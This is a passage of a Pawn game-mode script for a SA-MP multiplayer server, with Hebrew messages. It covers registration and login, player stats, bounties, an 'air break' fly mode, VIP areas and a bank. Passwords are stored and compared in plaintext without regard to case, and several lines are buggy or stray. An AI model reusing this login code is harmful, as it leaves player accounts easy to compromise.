if(!strlen(colornum) || !strlen(colornum2) || !strlen(colornum3)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /clan color [red-1-255] [green-1-255] [blue-1-255]");
if(!strval(colornum) || strval(colornum) > 255 || !strval(colornum2) || strval(colornum2) > 255 || !strval(colornum3) || strval(colornum3) > 255) return SendClientMessage(playerid,red,".צבע קלאן שגוי אנא בדוק את המספרים שהקלדת שנית");
new file_clan[256];
format(file_clan,sizeof(file_clan),"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));
dini_Set(file_clan,"Color1",colornum);
dini_Set(file_clan,"Color2",colornum2);
dini_Set(file_clan,"Color3",colornum3);
SetPlayerColor(playerid,sgba2hex(dini_Int(file,"Color1"),dini_Int(file,"Color2"),dini_Int(file,"Color3"),83));//צבע במפה

for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true))
{
format(strings,sizeof(strings),".שינה את הצבע של הקלאן לצבע של ההודעה \"%s\" - הלידר",GetName(playerid));
SendClientMessage(i,GetPlayerColor(playerid),strings);
}}
return true;
}



return SendClientMessage(playerid,red,".אפשרות קלאן שגויה");
}




if(!strcmp(cmd,"/register",true) || !strcmp(cmd,"/rdassadas",true))
{
new pass[256];

CheckPlayerCMDLevel(playerid,register);
if(IsPlayerLogged(playerid)) return SendClientMessage(playerid,red,"אתה כבר רשום");
pass = strtok(cmdtext,idx);
if(!strlen(pass)) return SendClientMessage(playerid,WHITE,"Usage: /register [password]");
if(30 < strlen(pass) || strlen(pass) < 3) return SendClientMessage(playerid,red,".30-3 אורך הסיסמה חייב להיות בין");

if(dini_Exists(GetPlayerFile(playerid)))
{
format(string, sizeof(string), "/login [password] :הינו שם משתמש רשום, להתחברות %s :שם המשתמש/ת", GetName(playerid));
SendClientMessage(playerid, WHITE, string);
return 1;
}
PlayerInfo[playerid][VIPS] = 0;
PlayerInfo[playerid][armourT] = 0;
PlayerInfo[playerid][ProfileLogged] =0;
PlayerInfo[playerid][Warnings] = 0;
PlayerInfo[playerid][Weeds] = 0;
PlayerInfo[playerid][TimeOnServer]++;
PlayerInfo[playerid][Logged] = 1;
PlayerInfo[playerid][Level] = 0;
PlayerInfo[playerid][Kills] = 0;
PlayerInfo[playerid][Deaths] = 0;
PlayerInfo[playerid][Bank] = 0;
PlayerInfo[playerid][Wars] = 0;
PlayerInfo[playerid][autologin] = 0;
PlayerInfo[playerid][GetAloan] =0;
PlayerInfo[playerid][MoneyLoan] =0;
PlayerInfo[playerid][AdminsLevel] = 0;
PlayerInfo[playerid][Kart] = 0;
PlayerInfo[playerid][AggInfo] =0;
PlayerInfo[playerid][GemelLogin] = 0;
PlayerInfo[playerid][KopatGemel] =0;
PlayerInfo[playerid][Monster] = 0;
PlayerInfo[playerid][RPGS] = 0;
PlayerInfo[playerid][MINIGUN] = 0;
PlayerInfo[playerid][Mlg] = 0;
PlayerInfo[playerid][CcMode] = 0;
PlayerInfo[playerid][Supportives] =0;
PlayerInfo[playerid][Tor] =0;
PlayerInfo[playerid][Pets] =0;
PlayerInfo[playerid][Shark] =0;
PlayerInfo[playerid][Dolp] =0;
PlayerInfo[playerid][SharkKills] =0;
PlayerInfo[playerid][DolphinKills]=0;
PlayerInfo[playerid][TorKills] =0;
PlayerInfo[playerid][bazooka] =0;
PlayerInfo[playerid][aLevelnl]=1;
PlayerInfo[playerid][aKillsnl]=100;

PlayerInfo[playerid][Level] = 0;
PlayerInfo[playerid][Kills] = 0;
PlayerInfo[playerid][Deaths] = 0;
PlayerInfo[playerid][Logged] = 1;
PlayerInfo[playerid][Sawn] = 0;
PlayerInfo[playerid][MicroSMG] = 0;
PlayerInfo[playerid][Tec9] = 0;
PlayerInfo[playerid][M4] = 0;
PlayerInfo[playerid][MP5] = 0;
PlayerInfo[playerid][AK47] = 0;
PlayerInfo[playerid][Knife] = 0;
PlayerInfo[playerid][Katana] = 0;
PlayerInfo[playerid][CombatShotGun] = 0;
PlayerInfo[playerid][ShotGun] = 0;
PlayerInfo[playerid][SniperRifle] = 0;
PlayerInfo[playerid][CRifle] = 0;
PlayerInfo[playerid][Colt] = 0;
PlayerInfo[playerid][Sawn] = 0;
pia[playerid][CarID]=0;
pia[playerid][OwnCar]=0;
PlayerInfo[playerid][BSHIP] = 0;
PlayerInfo[playerid][Ans] = 0;
dini_IntSet(GetPlayerFile(playerid),"Ans",0);
dini_IntSet(GetPlayerFile(playerid),"ClanLvl",0);
dini_IntSet(GetPlayerFile(playerid),"Kills",0);
dini_IntSet(GetPlayerFile(playerid),"Deaths",0);
dini_IntSet(GetPlayerFile(playerid),"Bank",0);
dini_IntSet(GetPlayerFile(playerid),"BSHIP",0);
dini_IntSet(GetPlayerFile(playerid),"Sawn",0);
dini_IntSet(GetPlayerFile(playerid),"MicroSMG",0);
dini_IntSet(GetPlayerFile(playerid),"Tec9",0);
dini_IntSet(GetPlayerFile(playerid),"M4",0);
dini_IntSet(GetPlayerFile(playerid),"MP5",0);
dini_IntSet(GetPlayerFile(playerid),"AK47",0);
dini_IntSet(GetPlayerFile(playerid),"Knife",0);
dini_IntSet(GetPlayerFile(playerid),"Katana",0);
dini_IntSet(GetPlayerFile(playerid),"CombatShotGun",0);
dini_IntSet(GetPlayerFile(playerid),"ShotGun",0);
dini_IntSet(GetPlayerFile(playerid),"SniperRifle",0);
dini_IntSet(GetPlayerFile(playerid),"CRifle",0);
dini_IntSet(GetPlayerFile(playerid),"Colt",0);
dini_IntSet(GetPlayerFile(playerid),"ofidcarid",0);
dini_IntSet(GetPlayerFile(playerid),"OFCARAR",0);
dini_IntSet(GetPlayerFile(playerid),"aLevelnl",1);
dini_IntSet(GetPlayerFile(playerid),"aKillsnl",100);
dini_IntSet(GetPlayerFile(playerid),"GemelLogin",0);
dini_IntSet(GetPlayerFile(playerid),"KopatGemel",0);
dini_IntSet(GetPlayerFile(playerid),"bazooka",0);
dini_IntSet(GetPlayerFile(playerid),"MoneyLoan",0);
dini_IntSet(GetPlayerFile(playerid),"GetAloan",0);
dini_IntSet(GetPlayerFile(playerid),"AggInfo",0);
dini_IntSet(GetPlayerFile(playerid),"TorKills",0);
dini_IntSet(GetPlayerFile(playerid),"DolphinKills",0);
dini_IntSet(GetPlayerFile(playerid),"SharkKills",0);
dini_IntSet(GetPlayerFile(playerid),"Tor",0);
dini_IntSet(GetPlayerFile(playerid),"Dolphin",0);
dini_IntSet(GetPlayerFile(playerid),"Pets",0);
dini_IntSet(GetPlayerFile(playerid),"Shark",0);
dini_IntSet(GetPlayerFile(playerid),"Supportives",0);
dini_IntSet(GetPlayerFile(playerid),"CC",0);
dini_IntSet(GetPlayerFile(playerid),"Kills",0);
dini_IntSet(GetPlayerFile(playerid),"Deaths",0);
dini_IntSet(GetPlayerFile(playerid),"Bank",0);
dini_IntSet(GetPlayerFile(playerid),"Wars",0);
dini_IntSet(GetPlayerFile(playerid),"Adminl",0);
dini_IntSet(GetPlayerFile(playerid),"Warning",0);
dini_IntSet(GetPlayerFile(playerid),"autologins",0);
dini_IntSet(GetPlayerFile(playerid),"VIP",0);
dini_IntSet(GetPlayerFile(playerid),"armour",0);
dini_IntSet(GetPlayerFile(playerid),"TimeOnServer",PlayerInfo[playerid][TimeOnServer]);
dini_IntSet(GetPlayerFile(playerid),"Karts",0);
dini_IntSet(GetPlayerFile(playerid),"MonsterWin",0);
dini_IntSet(GetPlayerFile(playerid),"RPGWIN",0);
dini_IntSet(GetPlayerFile(playerid),"MiniWin",0);
dini_IntSet(GetPlayerFile(playerid),"mlg",0);
dini_Create(GetPlayerFile(playerid));
RegisterPlayer(playerid,pass);
/*
new string_bot[256];
format(string_bot,sizeof(string_bot),"!שחקן חדש %s ברוך הבא ל",GetName(playerid));
SendPlayerBotMessage(playerid,COLOR_PINK,"Satla_Zone_Host",string_bot,1);
*/

SendClientMessage(playerid,0xFF99AADD,"!חשבונך נוצר בהצלחה");
SendClientMessage(playerid, WHITE, ".כעת מה שנשאר לך זה להקדיש כמה דק' לאישור הרשמתך והקראת החוקים");

PlayerInfo[playerid][Logged] = 2;
timers_rule[playerid][0] = SetTimerEx("Rule1", 2*1000, 0, "i", playerid);

return 1;
}

if(!strcmp(cmd,"/login",true) || !strcmp(cmd,"/www",true)) {
new pass2[256];
CheckPlayerCMDLevel(playerid,login);
if(IsPlayerLogged(playerid)) return SendClientMessage(playerid, red, ".אתה כבר מחובר");
pass2 = strtok(cmdtext,idx);
if(!strlen(pass2)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /Login [password]");
if(30 < strlen(pass2) || strlen(pass2) < 3) return SendClientMessage(playerid,red,".30-3 אורך הסיסמה חייב להיות בין");

if(!dini_Exists(GetPlayerFile(playerid)))
{
format(string, sizeof(string), "/register [password] :תרשם עם הפקודה ,%s", GetName(playerid));
SendClientMessage(playerid, red, string);
return 1;
}
if(!strcmp(pass2,dini_Get(GetPlayerFile(playerid),"Password"),true))
{

/*
new string_bot[256];
format(string_bot,sizeof(string_bot),"!התחבר לשרת %s השחקן",GetName(playerid));
SendPlayerBotMessage(playerid,COLOR_PINK,"Satla_Zone_Host",string_bot,1);
*/

PlayerInfo[playerid][TimeOnServer] +=1;
PlayerInfo[playerid][Logged] = 1;
LoginPlayer(playerid);
SendClientMessage(playerid,lblue, "--- !את/ה מחובר/ת כעת בהצלחה");


}
else
{
Flayeri[playerid] --;
PlayerInfo[playerid][FL]++;
format(string,sizeof(string),"Wrong Password: %d",Flayeri[playerid]);
SendClientMessage(playerid,red,string);

if(PlayerInfo[playerid][FL] >= 4)
{
format(string,sizeof(string),"*** %s has been kicked (4/4 התחברות נכשלה)",GetName(playerid));
SendClientMessageToAll(red,string);
Kick(playerid);
}
}
return 1;
}

new str[256];
if(!dini_Exists(GetPlayerFile(playerid))) return format(str, sizeof(str), "/register :על מנת להתחיל לשחק הירשם קודם"), SendClientMessage(playerid, red , str);
if(dini_Exists(GetPlayerFile(playerid)) && PlayerInfo[playerid][Logged] == 0) return format(str, sizeof(str), "/login :על מנת להתחיל לשחק התחבר קודם"),SendClientMessage(playerid, red, str);


if(!strcmp(cmd, "/pstats", true))
{
new sid[256], id;
sid = strtok(cmdtext,idx);
id = ReturnID(sid);

if(20 < strlen(sid)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid,WHITE,".המספר איידי שהזנת שגוי");
format(string, sizeof(string), "~~~ :%s הסטאטס של ~~~",GetName(id));
SendClientMessage(playerid, lblue, string);
format(string, sizeof(string), "Level: %d | Kills: %d | Bank: %d | VIP: %d",PlayerInfo[id][Level],PlayerInfo[id][Kills],PlayerInfo[id][Bank],PlayerInfo[id][VIPS]);
SendClientMessage(playerid, COLOR_YELLOW, string);
format(string, sizeof(string), "Clan: %s | Organization: %s | Tag: %s",dini_Get(GetPlayerFile(id),"Clan"),dini_Get(GetPlayerFile(id),"organization"),dini_Get(GetPlayerFile(id),"Tag"));
SendClientMessage(playerid, COLOR_YELLOW, string);
format(string, sizeof(string), "Register date: \"%d/%d/%d:%d:%d\" | Register name: \"%s\"",dini_Int(GetPlayerFile(id),"RegisterationDay"),dini_Int(GetPlayerFile(id),"RegisterationMonth"),dini_Int(GetPlayerFile(id),"RegisterationYear"),dini_Int(GetPlayerFile(id),"RegisterationHour"),dini_Int(GetPlayerFile(id),"RegisterationMinute"),GetName(id));
SendClientMessage(playerid, COLOR_YELLOW, string);

return 1;
}


if(!strcmp(cmd, "/hitman", true))
{
new sid[256], id,hitmanmoney[256];
sid = strtok(cmdtext,idx);
id = ReturnID(sid);
hitmanmoney = strtok(cmdtext,idx);

if(!strlen(sid)) return SendClientMessage(playerid,WHITE,"Usage: /hitman [id] [amount]");
if(!strlen(hitmanmoney)) return SendClientMessage(playerid,WHITE,"Usage: /hitman [id] [amount]");
if(aDoingSoon[playerid]) return SendClientMessage(playerid,red,".תוכל לעשות את הפקודה הזאתי שוב בקרוב");
if(20 < strlen(sid)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid,red,".איידי שגוי");
if(strval(hitmanmoney) > 10000 || strval(hitmanmoney) < 1000) return SendClientMessage(playerid,red,".סכום שגויי");
if(GetPlayerMoney(playerid) < strval(hitmanmoney)) return SendClientMessage(playerid,red,".אין עליך את הכסף הזה");
if(id == playerid) return SendClientMessage(playerid,red,".אתה לא יכול לשים כסף על עצמך");
aDoingSoon[playerid] = 1;
SetTimerEx("resetsoon_hitman",30*1000,0,"i",playerid);
hitman[id] += strval(hitmanmoney);
format(string, sizeof(string), ".$%d כעת יש על השחקן סכום של כ %s שם כסף על השחקן %s השחקן",strval(hitmanmoney),GetName(id),GetName(playerid));
SendClientMessageToAll(lblue, string);
LACY_GiveMoney(playerid,-strval(hitmanmoney));
return 1;
}

if(!strcmp(cmd, "/bounty", true))
{
new sid[256], id;

sid = strtok(cmdtext,idx);
id = ReturnID(sid);
if(!strlen(sid)) return SendClientMessage(playerid,red,"Usage: /bounty [id/name]");
if(20 < strlen(sid)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid,red,".המספר איידי שהזנת שגוי");
if(hitman[id] < 1) return SendClientMessage(playerid,red,".לשחקן זה אין כסף על הראש");

format(string, sizeof(string), "!$%d יש סכום של כ %s על השחקן",hitman[id],GetName(id));
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
return true;
}


if(!strcmp(cmd, "/stats", true))
{
format(string, sizeof(string), "~~~ :%s הסטאטס שלך ~~~",GetName(playerid));
SendClientMessage(playerid, lblue, string);
format(string, sizeof(string), "Level: %d | Kills: %d | Bank: %d | VIP: %d",PlayerInfo[playerid][Level],PlayerInfo[playerid][Kills],PlayerInfo[playerid][Bank],PlayerInfo[playerid][VIPS]);
SendClientMessage(playerid, COLOR_YELLOW, string);
format(string, sizeof(string), "Clan: %s | Organization: %s | Tag: %s",dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(playerid),"organization"),dini_Get(GetPlayerFile(playerid),"Tag"));
SendClientMessage(playerid, COLOR_YELLOW, string);
format(string, sizeof(string), "Register date: \"%d/%d/%d:%d:%d\" | Register name: \"%s\"",dini_Int(GetPlayerFile(playerid),"RegisterationDay"),dini_Int(GetPlayerFile(playerid),"RegisterationMonth"),dini_Int(GetPlayerFile(playerid),"RegisterationYear"),dini_Int(GetPlayerFile(playerid),"RegisterationHour"),dini_Int(GetPlayerFile(playerid),"RegisterationMinute"),GetName(playerid));
SendClientMessage(playerid, COLOR_YELLOW, string);
return 1;
}

if(!strcmp(cmd, "/Details", true))
{
format(string, sizeof(string), "~~~ :%s's :פרטי השחקן שלך ~~~",GetName(playerid));
SendClientMessage(playerid, lblue, string);
format(string, sizeof(string), "Weeds: %d/10 | TimeOnServer: %d | Warnings: %d/10", PlayerInfo[playerid][Weeds],PlayerInfo[playerid][TimeOnServer],PlayerInfo[playerid][Warnings]);
SendClientMessage(playerid, COLOR_YELLOW, string);
format(string, sizeof(string), "Clan: %s | Organization: %s", dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(playerid),"organization"));
SendClientMessage(playerid, COLOR_YELLOW, string);
format(string, sizeof(string), "Car: %s | Tag: %s", dini_Get(GetPlayerFile(playerid),"Car"),dini_Get(GetPlayerFile(playerid),"Tag"));
SendClientMessage(playerid, COLOR_YELLOW, string);
format(string, sizeof(string), ".Wars: %d |  Karting: %d |  Monster: %d |  Minigun: %d | Rpg: %d | Answers: %d",PlayerInfo[playerid][Wars],PlayerInfo[playerid][Kart],PlayerInfo[playerid][Monster],PlayerInfo[playerid][MINIGUN],PlayerInfo[playerid][RPGS],PlayerInfo[playerid][Ans]);
SendClientMessage(playerid, COLOR_YELLOW, string);
return 1;

}
if(!strcmp(cmd, "/pDetails", true))
{
new sid[256], id;
sid = strtok(cmdtext,idx);
id = ReturnID(sid);
if(20 < strlen(sid)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

if(!strlen(sid)) return SendClientMessage(playerid, red, "/pDetails [id/name]");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid,WHITE,".שחקנ/ית לא מחובר/ת");

format(string, sizeof(string), "~~~ :%s's :פרטי השחקן שלך ~~~",GetName(id));
SendClientMessage(playerid, lblue, string);
format(string, sizeof(string), "Weeds: %d/10 | TimeOnServer: %d | Warnings: %d/10", PlayerInfo[id][Weeds],PlayerInfo[id][TimeOnServer],PlayerInfo[id][Warnings]);
SendClientMessage(playerid, COLOR_YELLOW, string);
format(string, sizeof(string), "Clan: %s | Organization: %s", dini_Get(GetPlayerFile(id),"Clan"),dini_Get(GetPlayerFile(id),"organization"));
SendClientMessage(playerid, COLOR_YELLOW, string);
format(string, sizeof(string), "Car: %s | Tag: %s", dini_Get(GetPlayerFile(id),"Car"),dini_Get(GetPlayerFile(id),"Tag"));
SendClientMessage(playerid, COLOR_YELLOW, string);
format(string, sizeof(string), ".Wars: %d |  Karting: %d |  Monster: %d |  Minigun: %d | Rpg: %d | Answers: %d",PlayerInfo[id][Wars],PlayerInfo[id][Kart],PlayerInfo[id][Monster],PlayerInfo[id][MINIGUN],PlayerInfo[id][RPGS],PlayerInfo[id][Ans]);
SendClientMessage(playerid, COLOR_YELLOW, string);

return 1;
}

if(!strcmp(cmd, "/SysAdmin", true))
{
if (IsPlayerXAdmin(playerid,10))
{
SendClientMessage(playerid,red,".--- עזרה לאדמינים מערכות ---");
SendClientMessage(playerid,COLOR_GREY,"/StartWar - וואר התחלה - /StartKart - קארט התחלה");
SendClientMessage(playerid,COLOR_GREY,"/sMlgzohot - מלגזות התחלה - /StartMonster - מונסטר התחלה");
SendClientMessage(playerid,COLOR_GREY,"/sRpg טילים התחלה - /sMini - מיניגאן התחלה /startrace להתחלת מירוץ");
SendClientMessage(playerid,COLOR_GREY,"/stria להתחיל טריאטלון -  /startdrift להתחלת מירוץ דריפט");
SendClientMessage(playerid,COLOR_GREY,"/Warnings אזהרה לשחקן - /SetBank ערוך בנק - /SetKills ערוך הריגות");
SendClientMessage(playerid,COLOR_GREY,"/GiveSup [playerid] [1] :כדאי לתת למישהוא להיות חבר בצוות תמיכה");
SendClientMessage(playerid,COLOR_GREY,"/GiveVip [playerid] [levelvip] .אדמינים שימו לב תתנו רק למי שבהמת משקיע בשרת VIPלתת למישהוא גישות ל");
SendClientMessage(playerid,COLOR_GREY,"/races drift || bike || race :הפעלת אחת מהמערכת המירוצים");


//
}
else
{
SendClientMessage(playerid,red,".רק אדמינים רמה 10 ומעלה יכולים לראות את הפקודות");
}
return 1;
}


if(!strcmp(cmd,"/sp",true))
{

//IsObjectInZone
if(InBike[playerid]==1||YouRegister[playerid]==1||Youregisterrace[playerid] == 1||InWarw[playerid] == 1||InWarr[playerid]== 1||InWar[playerid]==1||InCha[playerid] == 1||InKart[playerid] == 1||iNmOnster[playerid] == 1) return SendClientMessage(playerid,red,".אתה לא יכול להפעיל את מצב האיר ברייק כרגע, אתה רשום ל-1 מהפעיליות שאסור שם אייר ברייק");
if(InBike[playerid]==1||YouRegister[playerid]==1||Youregisterrace[playerid] == 1||InWarw[playerid] == 1||InWarr[playerid]== 1||InWar[playerid]==1||InCha[playerid] == 1||InKart[playerid] == 1||iNmOnster[playerid] == 1) return SendClientMessage(playerid,red,".אתה לא יכול להפעיל את מצב האיר ברייק כרגע, אתה רשום ל-1 מהפעיליות שאסור שם אייר ברייק");
if(InArea(playerid, 404.8684, 35.6969, 2102.7212, 1653.4156)) return SendClientMessage(playerid,WHITE,".תודה VIP אין לשמור מיקום במפקדת ה");
if(InArea(playerid,-1867.1172 ,-2046.8510, 365.2502,189.3918)) return SendClientMessage(playerid,WHITE,".אין לשמור מיקום במוסך וואנג");
if (PlayerInfo[playerid][Level] < 2) return Messagelevel (playerid, 2);
new Float:p[3];
GetPlayerPos(playerid,p[0],p[1],p[2]);
if(PlayerInfo[playerid][Saved] == 1)
{
SendClientMessage(playerid,WHITE,".שמרת מקום חדש");
}
else
{
SendClientMessage(playerid,WHITE,".שמרת מקום חדש");
}
PlayerInfo[playerid][Saved] = 1,
PlayerInfo[playerid][SPX] = p[0],
PlayerInfo[playerid][SPY] = p[1],
PlayerInfo[playerid][SPZ] = p[2],
PlayerInfo[playerid][SPI] = GetPlayerInterior(playerid);
dini_IntSet(GetPlayerFile(playerid),"Saved",1);
dini_FloatSet(GetPlayerFile(playerid),"SavePosX",PlayerInfo[playerid][SPX]);
dini_FloatSet(GetPlayerFile(playerid),"SavePosY",PlayerInfo[playerid][SPY]);
dini_FloatSet(GetPlayerFile(playerid),"SavePosZ",PlayerInfo[playerid][SPZ]);
dini_IntSet(GetPlayerFile(playerid),"SavePosI",PlayerInfo[playerid][SPI]);

return 1;
}
//==

	if(strcmp("/abon", cmdtext, true, 12) == 0)
	{
        if (PlayerInfo[playerid][Level] < 5) return Messagelevel (playerid, 5);
if(InBike[playerid]==1||YouRegister[playerid]==1||Youregisterrace[playerid] == 1||InWarw[playerid] == 1||InWarr[playerid]== 1||InWar[playerid]==1||InCha[playerid] == 1||InKart[playerid] == 1||iNmOnster[playerid] == 1) return SendClientMessage(playerid,red,".אתה לא יכול להפעיל את מצב האיר ברייק כרגע, אתה רשום ל-1 מהפעיליות שאסור שם אייר ברייק");

		if(AirBreakVar[playerid] == 0)
		{
			if(IsPlayerInAnyVehicle(playerid) == 0)
			{
				AirBreakVar[playerid] = 1;
				SetCameraBehindPlayer(playerid);

				TogglePlayerControllable(playerid, 0);
				SendClientMessage(playerid, red, "/aboff -.האייר ברייק שלך דולק, בהצלחה, על מנת לכבות");
			}
			else
			{
				SendClientMessage(playerid, red, ".אתה לא יכול להפעיל אייר ברייק בתוך רכב");
			}
		}
		else
		{
			SendClientMessage(playerid, red, ".האייר ברייק שלך כבר פעיל");
		}
		return 1;
	}

	if(strcmp("/aboff", cmdtext, true, 12) == 0)
	{
		if(AirBreakVar[playerid] == 1)
		{
			AirBreakVar[playerid] = 0;
			TogglePlayerControllable(playerid, 1);
			SendClientMessage(playerid, red, ".האייר ברייק שלך כובה בהצלחה");
		}
		else
		{
			SendClientMessage(playerid, red, ".האייר ברייק שלך כבר כבוי");
		}
		return 1;
	}

	if(strcmp("/abset", cmdtext, true, 6) == 0)
	{
		if(AirBreakVar[playerid] == 1)
		{
			new  pos = strfind(cmdtext, " ", true);
			strdel(cmdtext, 0, pos + 1);

			SetDistance[playerid] = strval(cmdtext);

			format(string, sizeof(string), ".%d - מהירות האייר ברייק שלך", strval(cmdtext));
			SendClientMessage(playerid, red, string);
		}
		else
		{
			SendClientMessage(playerid, red, ".שלך, לא פועל AirBreak-ה");
		}
		return 1;
	}




if(strcmp(cmd, "/VIP", true) == 0)
{
new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer))
{
SendClientMessage(playerid,WHITE,"/VIP lock/off/list/go - :אפשריות ");

return 1;
}
else if(strcmp(Roy_Killer,"off",true) == 0)
{
if (PlayerInfo[playerid][VIPS] >= 1)
{
GetPlayerPos(playerid,Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
SetPlayerCameraPos(playerid, Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
SetPlayerCameraLookAt(playerid, Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
SetCameraBehindPlayer(playerid);
TogglePlayerControllable(playerid, 1);
SendClientMessage(playerid,red,".שלך VIP יצאת ממצב צפייה במפקדת");
}
else
{
SendClientMessage(playerid,red,".בלבד VIP פקודה זאתי לחברי");
}
return true;
}
else if(strcmp(Roy_Killer,"lock",true) == 0)
{
if (PlayerInfo[playerid][VIPS] >= 1)
{

SetPlayerCameraPos(playerid,264.5831,1896.2504,33.8984);
SetPlayerCameraLookAt(playerid,212.5598,1895.0790,16.2901);
SendClientMessage(playerid,red,".שלך VIPכעת אתה מסתכל על מפקדת ה");
}
else
{
SendClientMessage(playerid,red,".בלבד VIP פקודה זאתי לחברי");
}
return true;
}
else if(strcmp(Roy_Killer,"Go",true) == 0)
{
if (PlayerInfo[playerid][VIPS] >= 1)
{
CreateTeleport(playerid,0,212.5598,1895.0790,16.2901,317.6359,1);
SetPlayerInterior(playerid,0);
SendClientMessage(playerid,red,".כאן התגוררו חברי השרת VIPברוכים הבאים למפקדה ה");
}
else
{
SendClientMessage(playerid,red,".בלבד VIP פקודה זאתי לחברי");
}
return true;
}
else if(strcmp(Roy_Killer,"list",true) == 0)
{
if(IsPlayerConnected(playerid))
{
format(string, 256, "~~~ :שמחוברים לשרת VIP חברי ~~~");
SendClientMessage(playerid, lblue, string);

fnm
if(IsPlayerConnected(i))
{
if(PlayerInfo[i][VIPS] >=1)
{
format(string, 256, " %s  [%d] ", GetName(i), i);
SendClientMessage(playerid, COLOR_GREEN, string);
}
}
}
}
return true;
}
return SendClientMessage(playerid,red,".שגויה VIP פקודה");
}
//====================BANK
if (strcmp("/Bank", cmdtext, true, 10) == 0)
{
CreateTeleport(playerid,1,2144.0793,1612.3879,993.6882,317.6359,0);
SetPlayerInterior(playerid,1);
ResetPlayerWeapons(playerid);
AtBank[playerid] = 1;
return 1;
}

if (strcmp("/vinfo", cmdtext, true, 10) == 0){
new Float:healths;
new vehicleid = GetPlayerVehicleID(playerid);
GetVehicleHealth(vehicleid, healths);

if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,WHITE,"! אתה צריך להיות במכונית שאתה רוצה ליקנות ");
SendClientMessage(playerid,red,".-:הפרטים עבור הרכב שאתה נוסע בוא --");
format(string, sizeof(string), "%.1f  :החיים של הרכב", healths),SendClientMessage(playerid, COLOR_GREY, string);
format(vehname,999,".%s :השם של הרכב",VehiclesName[GetVehicleModel(GetPlayerVehicleID(playerid))-400]),SendClientMessage(playerid,COLOR_GREY,vehname);
format(vehname,999,".%d :האיידי של הרכב",GetVehicleModel(GetPlayerVehicleID(playerid))),SendClientMessage(playerid,COLOR_GREY,vehname);

return 1;
}

//====================Bank System
if(!strcmp(cmd, "/deposit", true))
{
if(!CPS_IsPlayerInCheckpoint(playerid,bcp)) return SendClientMessage(playerid,red,".אתה חייב להיות בבנק לביצוע פקודה זו");
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(PlayerInfo[playerid][GetAloan] ==1) return format(string, sizeof(string),"%d :אתה חייב לבנק סכום כספי של",PlayerInfo[playerid][MoneyLoan]),SendClientMessage(playerid,WHITE,string),SendClientMessage(playerid,WHITE,".חסר לך כסף להחזרת ההלואה אנא אסוף תכסף והחזר לבנק עד אז לא תוכל להשתמש בבנק");
if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /deposit [amount]");
moneysa[playerid] = strval(tmp);
if(20 < strlen(moneysa[playerid])) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(moneysa[playerid] < 1) return SendClientMessage(playerid, red, ".אתה חייב להכניס סכום יותר גדול מ 0 ");

if(PlayerInfo[playerid][Bank] >= 1000000       && PlayerInfo[playerid][Level] == 0) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 2000000       && PlayerInfo[playerid][Level] == 1) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 3000000       && PlayerInfo[playerid][Level] == 2) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 4000000     && PlayerInfo[playerid][Level] == 3) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 5000000     && PlayerInfo[playerid][Level] == 4) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 6000000     && PlayerInfo[playerid][Level] == 5) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 7000000     && PlayerInfo[playerid][Level] == 6) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 8000000     && PlayerInfo[playerid][Level] == 7) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 9000000     && PlayerInfo[playerid][Level] == 8 ) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
